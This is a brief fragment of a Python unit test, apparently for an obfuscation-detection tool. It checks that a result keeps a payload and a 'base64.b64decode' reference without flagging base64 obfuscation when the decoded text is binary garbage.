    # binary-garbage "decoded" text.
    assert payload in result.content
    assert "base64.b64decode" in result.content
    assert ObfuscationTechnique.BASE64 not in result.techniques
